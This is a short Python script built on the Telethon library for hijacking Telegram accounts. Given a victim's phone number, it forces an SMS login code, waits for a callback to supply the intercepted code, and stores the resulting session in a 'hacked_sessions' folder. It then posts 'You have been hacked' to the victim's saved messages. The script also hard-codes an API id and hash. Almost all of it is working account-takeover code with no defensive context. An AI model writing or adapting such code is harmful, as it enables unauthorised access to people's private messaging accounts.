from telethon import TelegramClient
import asyncio

api_id = 1282215
api_hash = '397d3eeb55309e02b2c623daa94b321b'

auth_codes = {}
auth_code_stolen = {}

def hack_user_account(user_id, phone, steal_auth_code: callable):
    """usage: in steal_auth_code(user_id), set auth_codes[user_id] and then auth_code_stolen[user_id]"""

    # we want the auth code for a specific user and cant pass arguments for callables
    async def get_this_auth_code():
        return await get_auth_code(user_id, steal_auth_code)

    client = TelegramClient(f"hacked_sessions/{user_id}", api_id, api_hash)
    client.start(phone, force_sms=True, code_callback=get_this_auth_code)
    client.loop.run_until_complete(client.send_message('me', 'You have been hacked'))

async def get_auth_code(user_id, steal_auth_code: callable):
    """waits for auth_code_stolen[user_id] to be set and expects the code in auth_codes[user_id]"""

    auth_code_stolen[user_id] = asyncio.Event()
    auth_codes[user_id] = None
    steal_auth_code(user_id)
    await auth_code_stolen[user_id].wait()
    return auth_codes[user_id]
